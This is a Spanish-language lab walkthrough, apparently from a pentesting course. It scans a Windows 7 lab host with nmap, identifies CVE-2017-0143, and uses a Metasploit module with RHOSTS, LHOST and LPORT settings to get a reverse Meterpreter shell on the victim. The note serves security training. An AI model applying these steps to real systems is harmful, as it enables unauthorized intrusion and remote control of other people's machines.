Hemos hecho la búsqueda de equipos en la red como hemos aprendido anteriormente y hemos escogido un maquina y un puerto para hacerle un script de vulnerabilidades

```Bash
nmap --script "vuln" -p445 10.0.3.6
```

Siendo este el resultado:

![[Imagenes/image 10.png|image 10.png]]

  

Muestro objetivo en este ejercicio es entrar en la maquina objetivo que es un Windows 7.

Copiamos el CVE y lo apuntamos por que lo vamos a necesitar. **CVE-2017-0143**

  

- Vamos a abrir el Metasploit Framework. Lo podemos hacer de dos maneras **escribiendo el siguiente comando**:
    
    ```Bash
    sudo msfdb init && msfconsole 
    ```
    
      
    
    > [!important] `**sudo msfdb init**`:
    > 
    > - Este comando inicializa la base de datos que utiliza Metasploit. `msfdb` gestiona bases de datos, como PostgreSQL, que se emplean para almacenar información sobre los hosts y exploits durante la ejecución de Metasploit.
    > - Requiere permisos de superusuario (`sudo`) para configurar correctamente los servicios relacionados.
    > 
    > `**&&**`:
    > 
    > - Permite encadenar comandos. Su función es sencilla: el segundo comando se ejecutará solo si el primero se completa con éxito (es decir, si no hay errores en el primer comando).
    > 
    > `**msfconsole**`:
    > 
    > - Este comando lanza la consola interactiva de Metasploit. Es el punto principal de interacción con el framework.
    

O desde el **menú de aplicaciones**:

![[Imagenes/image 1 7.png|image 1 7.png]]

  

- Ya dentro del del Metasploit vamos a utilizar el comando **search.**
    
    Tenemos dos opciones podemos escribir el CVE o la vulnerabilidad que previamente habremos averiguado haciendo una investigación por internet.
    
    ![[Imagenes/image 2 6.png|image 2 6.png]]
    
    ![[Imagenes/image 3 5.png|image 3 5.png]]
    
      
    
    A partir de aquí es ir probando, no hay un método infalible, nos fijaremos en el ranquin por ejemplo.
    
- Vamos a **usar el exploit** numero 0:
    
    `use 0`
    
    ![[Imagenes/image 4 4.png|image 4 4.png]]
    
      
    
    Como vemos el prompt a cambiado indicándonos que a cargado el exploit y que estamos dentro de el.
    
    - Le decimos que nos muestre las **opciones de configuración del exploit**:
        
        `show options`
        
        ![[Imagenes/image 5 4.png|image 5 4.png]]
        
          
        
        > [!important] Tenemos que tener en cuenta que dentro del exploit existen el exploit en si y el Payload (la carga útil).
        > 
        > **Exploit**:
        > 
        > - Un _**exploit**_ es un código o técnica que aprovecha una vulnerabilidad o debilidad en un sistema, software o aplicación. El propósito de un exploit puede variar, pero generalmente es para obtener acceso no autorizado, ejecutar comandos o causar un fallo en el sistema.
        > 
        > **Payload**:
        > 
        > - Un _**payload**_ es el "código útil" que se ejecuta una vez que el exploit tiene éxito. En otras palabras, es lo que hace el trabajo real después de que se ha explotado la vulnerabilidad.
        > - Los payloads pueden realizar varias acciones: abrir una puerta trasera (_backdoor_), obtener información del sistema, agregar un usuario administrativo, o incluso ejecutar malware.
        
          
        
        ![[Imagenes/image 6 3.png|image 6 3.png]]
        
          
        
        Si nos fijamos vemos que hay campos que son obligatorios y otros no y campos que ya están rellenados. Pues debemos rellenar al menos los campos obligatorios para que el exploit pueda ser lanzado.
        
        - Empezamos. **RHOSTS que seria la IP de la maquina victima** que previamente hemos conseguido en el reconocimiento de la red.
            
            `set RHOSTS 10.0.3.6`
            
            ![[Imagenes/image 7 2.png|image 7 2.png]]
            
            Vamos a verificar que se a cargado el parámetro. hacemos un `clear` y un `show options` .
            
            ![[Imagenes/image 8 2.png|image 8 2.png]]
            
        
          
        
        - **RPORT el puerto contra el que lanzaremos el exploit**. En este caso ya viene por defecto ya. Pero si configuramos otro exploit debemos fijarnos si esta puesto y si es el correcto para ese exploit en concreto.
        
        Miraremos también que la configuración del Payload sea la correcta. Por ejemplo **LHOST** seria la IP de nuestra maquina atacante y esto es importante por que es donde yo voy a recibir la conexión reverse, Ya que es donde yo quiero enviarme a mi mismo el control de la maquina victima.
        
        En caso de querer saber nuestra IP podemos usar estos comandos en una terminal.
        
        - `ifconfig`
        - `hostname -I`
        
          
        
        **LPORT seria el puerto que esta a la escucha** , por norma general Metasploit ya tiene unos puertos por defecto para esto y nos los escoge por defecto.
        
        **La modificación** de estos datos **seria siempre igual** :
        
        `set RHOSTS 10.0.3.6`
        
        `set LHOST 10.0.3.4`
        
        `set LPORT 4444`
        
        `etc…`
        
        Cuando estemos listos. Para ejecutar el exploit podemos usar el comando `run` o el comando `exploit`
        
        ![[Imagenes/image 9 2.png|image 9 2.png]]
        
          
        
        ![[Imagenes/image 10 2.png|image 10 2.png]]
        
          
        
        Como vemos nos muestra el **prompt de una consola Meterpreter**. Aquí entra en juego **saber manejar comandos de Linux o Windows**. En este caso como estamos dentro de una maquina Windows debemos saber movernos con los comandos de un terminal CMD.
        
        ![[image 11.png]]
        
        ![[image 12.png]]
        
          
        
        Vamos a hacer una prueba. vamos a crear una carpeta dentro del escritorio de Windows.
        
        ![[image 13.png]]
        
        ![[image 14.png]]
        
        ![[image 15.png]]
        
          
        
        Esto es básicamente como se explota una vulnerabilidad de forma estándar.